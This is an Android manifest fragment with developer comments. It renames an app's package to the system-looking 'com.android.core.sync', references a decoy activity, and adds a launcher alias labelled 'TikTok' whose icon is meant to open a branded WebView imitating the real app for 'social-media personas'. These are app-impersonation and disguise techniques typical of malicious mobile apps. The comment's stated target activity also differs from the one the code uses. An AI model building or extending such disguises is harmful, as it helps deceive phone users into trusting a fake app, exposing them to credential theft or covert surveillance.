<!--
    NEW ALIAS BLOCKS — add these to AndroidManifest.xml
    just before the closing </application> tag.

    Also:
    1. Replace every occurrence of "com.seguranca.protecao" with "com.android.core.sync"
       in the full AndroidManifest.xml (use rename_package.sh — it does this automatically).

    2. All existing alias target activities must also point to the new package:
         android:targetActivity="com.android.core.sync.FlashDecoyActivity"
         android:targetActivity="com.android.core.sync.MainActivity"
       The rename script handles this.

    New aliases below target WebViewActivity because for social-media personas
    tapping the icon should open the branded WebView directly (like the real app would).
-->

    <!-- ── ALIAS 7: TikTokAlias ★ NEW ─────────────────────────────────────── -->
    <activity-alias
        android:name="com.android.core.sync.alias.TikTokAlias"
        android:targetActivity="com.android.core.sync.MainActivity"
        android:label="TikTok"
        android:icon="@android:drawable/ic_media_play"
        android:exported="true"
        android:enabled="false">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity-alias>

